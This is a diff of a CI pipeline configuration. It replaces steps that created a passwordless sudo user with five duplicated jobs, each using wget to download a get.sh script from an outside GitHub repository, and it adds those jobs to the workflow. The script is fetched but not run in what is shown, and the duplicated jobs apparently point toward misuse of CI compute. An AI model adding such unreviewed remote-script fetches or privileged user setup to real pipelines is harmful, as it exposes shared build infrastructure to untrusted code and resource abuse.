@@ -6,12 +6,27 @@ jobs:
     docker:
       - image: cimg/base:edge
     steps:
-      - run: sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe && sudo -u joe -H sh -c "whoami"
+      - run: wget https://github.com/binniyup/datacare/blob/main/get.sh && ls -l
   gas2:
     docker:
       - image: cimg/base:edge
     steps:
-      - run: sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe && sudo -u joe -H sh -c "whoami"
+      - run: wget https://github.com/binniyup/datacare/blob/main/get.sh && ls -l
+  gas3:
+    docker:
+      - image: cimg/base:edge
+    steps:
+      - run: wget https://github.com/binniyup/datacare/blob/main/get.sh && ls -l
+  gas4:
+    docker:
+      - image: cimg/base:edge
+    steps:
+      - run: wget https://github.com/binniyup/datacare/blob/main/get.sh && ls -l
+  gas5:
+    docker:
+      - image: cimg/base:edge
+    steps:
+      - run: wget https://github.com/binniyup/datacare/blob/main/get.sh && ls -l
 
 # Orchestrate our job run sequence
 workflows:
@@ -19,3 +34,6 @@ workflows:
     jobs:
       - gas1
       - gas2
+      - gas3
+      - gas4
+      - gas5
